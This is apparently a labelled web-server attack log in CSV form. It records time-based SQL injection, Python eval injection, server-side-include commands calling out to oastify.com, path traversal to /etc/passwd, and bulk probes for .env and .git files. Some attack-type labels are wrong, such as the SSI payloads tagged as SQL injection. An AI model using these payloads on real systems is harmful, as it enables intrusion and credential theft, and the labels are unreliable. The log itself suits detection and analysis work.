timestamp,ip,method,url,status,attack_type,user_agent
2025-05-22 05:25:26,173.239.196.9,POST,/design-and-Evaluation-cell'%20AND%20pg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:25:56,173.239.196.14,GET,/public/frontend/template/css/fonts'%20AND%20pg_sleep(20)--/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:26:16,173.239.196.13,POST,/design-and-Evaluation-cell'%2c''%7c%7cpg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:26:48,173.239.196.11,GET,/public/frontend/template/css/fonts'%2c''%7c%7cpg_sleep(20)--/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:27:02,173.239.196.9,POST,/design-and-Evaluation-cell')AND%20pg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:27:47,173.239.196.9,POST,/design-and-Evaluation-cell'%2c0)AND%20pg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:28:19,173.239.196.10,POST,/../../../../../../../../../../../../../../../../etc/passwd,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-22 05:29:11,173.239.196.13,POST,//etc/passwd,200,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:30:03,173.239.196.15,POST,/Simulators../../../../../../../../../../../../../../../../etc/passwd,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-22 05:30:40,173.239.196.14,POST,/../../../../../../../../../../../../../../../../etc/passwd,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-22 05:30:52,173.239.196.9,POST,/../../../../../../../../../../../../../../../../etc/passwd%00Simulators,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-22 05:31:34,173.239.196.12,POST,//etc/passwd,200,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:32:32,173.239.196.13,POST,/OJT../../../../../../../../../../../../../../../../etc/passwd,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-22 05:33:14,173.239.196.15,POST,/../../../../../../../../../../../../../../../../etc/passwd%00OJT,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-22 05:35:47,173.239.196.9,POST,/%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22sr9%22%20value%3d%22rq8ubpwmnp%22--%3e%3c!--%23set%20var%3d%22utb%22%20value%3d%22tsawdryopr%22--%3e%3c!--%23echo%20var%3d%22sr9%22--%3e%3c!--%23echo%20var%3d%22utb%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20edvhycj9ac6w5pbko0jc9yrw6ncg0do5mtdl0bo0.oastify.com%22%20--%3e,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:36:06,173.239.196.10,POST,/../../../../../../../../../../../../../../../../etc/passwd,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-22 05:36:59,173.239.196.11,POST,//etc/passwd,200,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:37:43,173.239.196.15,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024../../../../../../../../../../../../../../../../etc/passwd,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-22 05:38:10,173.239.196.12,POST,/%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22sr9%22%20value%3d%22rq8ubpwmnp%22--%3e%3c!--%23set%20var%3d%22utb%22%20value%3d%22tsawdryopr%22--%3e%3c!--%23echo%20var%3d%22sr9%22--%3e%3c!--%23echo%20var%3d%22utb%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20edvhycj9ac6w5pbko0jc9yrw6ncg09o1mpdh07ow.oastify.com%22%20--%3e,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:38:26,173.239.196.12,POST,/../../../../../../../../../../../../../../../../etc/passwd%00Bangladesh-Navy-Civilian-Technical--Recruitment-2024,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-22 05:40:40,173.239.196.15,POST,/design-and-Evaluation-cell'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:41:20,173.239.196.11,POST,/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single')),200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:41:41,173.239.196.10,GET,/public/frontend/template/css/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:41:58,173.239.196.10,POST,/design-and-Evaluation-cell'.sleep(20).',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:42:16,49.43.160.88,GET,/.git/HEAD,200,Sensitive Data Exposure Probe,Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
2025-05-22 05:42:18,173.239.196.15,GET,/public/frontend/template/css/fonts%7b$%7bsleep(20)%7d%7d/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:42:32,173.239.196.13,POST,/%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%226d9%22%20value%3d%225c88x3i093%22--%3e%3c!--%23set%20var%3d%228fb%22%20value%3d%227eaaz5k2b5%22--%3e%3c!--%23echo%20var%3d%226d9%22--%3e%3c!--%23echo%20var%3d%228fb%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20szvvkq5nwqsar3xyae5qvcdas1yumoag84zwmmab.oastify.com%22%20--%3e,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:42:37,36.85.218.102,GET,/.git/HEAD,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Sa"
2025-05-22 05:42:37,36.85.218.102,GET,/.git/config,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Sa"
2025-05-22 05:42:38,173.239.196.11,POST,/design-and-Evaluation-cell%7b$%7bsleep(20)%7d%7d,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:50:07,173.239.196.12,GET,/public/frontend/template/css/../../../../../../../../../../../../../../../../etc/passwd/fontawesome-webfont.woff2?v=4.6.1,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-22 05:50:33,173.239.196.15,GET,/public/frontend/template/css//etc/passwd/fontawesome-webfont.woff2?v=4.6.1,200,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:50:59,173.239.196.13,GET,/public/frontend/template/css/fonts../../../../../../../../../../../../../../../../etc/passwd/fontawesome-webfont.woff2?v=4.6.1,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-22 05:51:30,173.239.196.15,GET,/public/frontend/template/css/../../../../../../../../../../../../../../../../etc/passwd%00fonts/fontawesome-webfont.woff2?v=4.6.1,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-22 05:54:18,173.239.196.9,POST,/../../../../../../../../../../../../../../../../etc/passwd,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-22 05:54:53,173.239.196.9,POST,//etc/passwd,200,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:55:34,173.239.196.15,POST,/design-and-Evaluation-cell../../../../../../../../../../../../../../../../etc/passwd,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-22 05:56:11,173.239.196.11,POST,/../../../../../../../../../../../../../../../../etc/passwd%00design-and-Evaluation-cell,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-22 05:59:54,173.239.196.10,POST,/%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22u9t%22%20value%3d%22t8swtreo5r%22--%3e%3c!--%23set%20var%3d%22wbv%22%20value%3d%22vauyvtgq7t%22--%3e%3c!--%23echo%20var%3d%22u9t%22--%3e%3c!--%23echo%20var%3d%22wbv%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20gvfjge1bseoynrtm621er09yopuiih694xvpif64.oastify.com%22%20--%3e,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:04:07,173.239.196.12,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2'(select*from(select(sleep(20)))a)'?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:04:28,173.239.196.9,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2'%2b(select*from(select(sleep(20)))a)%2b'?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:04:58,173.239.196.9,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2'%20and%20(select*from(select(sleep(20)))a)--%20?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:05:33,173.239.196.11,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2%2c(select*from(select(sleep(20)))a)?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:06:03,173.239.196.11,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2'%20waitfor%20delay'0%3a0%3a20'--?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:06:34,173.239.196.10,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2')waitfor%20delay'0%3a0%3a20'--?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:07:04,173.239.196.9,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2'%2c0)waitfor%20delay'0%3a0%3a20'--?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:07:33,173.239.196.9,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2'%7c%7cpg_sleep(20)--?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:08:36,173.239.196.11,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2'%20AND%20pg_sleep(20)--?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:09:06,173.239.196.12,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2'%2c''%7c%7cpg_sleep(20)--?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:09:11,49.43.160.88,GET,/.env,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.3"
2025-05-22 06:09:16,173.252.107.6,GET,/robots.txt,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 06:09:26,49.43.160.88,GET,/!.htaccess,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:09:31,49.43.160.88,GET,/.%2E/%2E%2E/%2E%2E/%2E%2E/etc/passwd,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-22 06:09:32,49.43.160.88,GET,/!.htaccess,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:09:42,173.239.196.9,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2')AND%20pg_sleep(20)--?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:09:58,49.43.160.88,GET,/.c9/metadata/environment/.env,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:05,173.239.196.11,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2'%2c0)AND%20pg_sleep(20)--?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:10:12,49.43.160.88,GET,/.config.php.swp,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:28,49.43.160.88,GET,/.docker/.env,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:29,49.43.160.88,GET,/.docker/laravel/app/.env,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:31,49.43.160.88,GET,/.DS_Store,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:32,49.43.160.88,GET,/.ds_store,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:36,49.43.160.88,GET,/.env,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:36,49.43.160.88,GET,/.env.example,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:37,49.43.160.88,GET,/.env-example,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:38,49.43.160.88,GET,/.env.development.local,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:38,49.43.160.88,GET,/.env.development.sample,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:38,49.43.160.88,GET,/.env.dev,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:38,49.43.160.88,GET,/.env.backup,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:38,49.43.160.88,GET,/.env.dev.local,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:39,49.43.160.88,GET,/.env.dist,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:39,49.43.160.88,GET,/.env-sample,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:39,49.43.160.88,GET,/.env.php,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:39,49.43.160.88,GET,/.env.docker.dev,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:39,49.43.160.88,GET,/.env.docker,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:39,49.43.160.88,GET,/.env.local,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:40,49.43.160.88,GET,/.env.prod,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:40,49.43.160.88,GET,/.env.prod.local,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:40,49.43.160.88,GET,/.env.sample.php,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:40,49.43.160.88,GET,/.env.production,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:41,49.43.160.88,GET,/.env.sample,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:41,49.43.160.88,GET,/.env.stage,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:41,49.43.160.88,GET,/.env.test,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:41,49.43.160.88,GET,/.env.save,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:41,49.43.160.88,GET,/.env.test.local,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:42,49.43.160.88,GET,/.env.production.local,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:42,49.43.160.88,GET,/.env.test.sample,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:42,49.43.160.88,GET,/.env.travis,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:42,49.43.160.88,GET,/.environment,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:43,49.43.160.88,GET,/.envrc,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:43,49.43.160.88,GET,/.env~,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:43,49.43.160.88,GET,/.envs,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:57,49.43.160.88,GET,/.ghc.environment,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:58,49.43.160.88,GET,/.git/,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:58,49.43.160.88,GET,/.git/branches/,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:59,49.43.160.88,GET,/.git/COMMIT_EDITMSG,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:59,49.43.160.88,GET,/.git/description,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:59,49.43.160.88,GET,/.git/config,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:59,49.43.160.88,GET,/.git/FETCH_HEAD,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:59,49.43.160.88,GET,/.git/HEAD,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:00,49.43.160.88,GET,/.git/head,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:00,49.43.160.88,GET,/.git/hooks/,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:00,49.43.160.88,GET,/.git/hooks/applypatch-msg,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:00,49.43.160.88,GET,/.git/hooks/post-update,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:01,49.43.160.88,GET,/.git/hooks/pre-rebase,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:01,49.43.160.88,GET,/.git/hooks/commit-msg,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:01,49.43.160.88,GET,/.git/hooks/pre-push,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
